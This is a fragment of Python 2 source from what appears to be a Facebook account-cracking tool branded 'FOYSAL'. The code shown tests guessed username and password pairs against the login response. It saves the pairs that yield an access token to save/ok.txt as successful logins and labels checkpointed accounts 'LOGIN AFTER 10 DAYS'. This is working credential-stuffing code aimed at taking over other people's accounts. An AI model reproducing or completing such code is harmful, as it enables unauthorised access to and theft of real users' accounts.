    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[FOYSAL-successfull]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n' + '\x1b[1;92m  [JUST NOW LOGIN]\n'
                okb = open('save/ok.txt', 'a')
                okb.write(k + c + user + '|' + c + pass1 + '\n')
                okb.close()
                oks.append(c + user + c + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;96m[FOYSAL-CHECKPOINT] \x1b[1;97m' + k + c + user + ' | ' + pass1 + '\x1b[1;96m  [LOGIN AFTER 10 DAYS]\n'
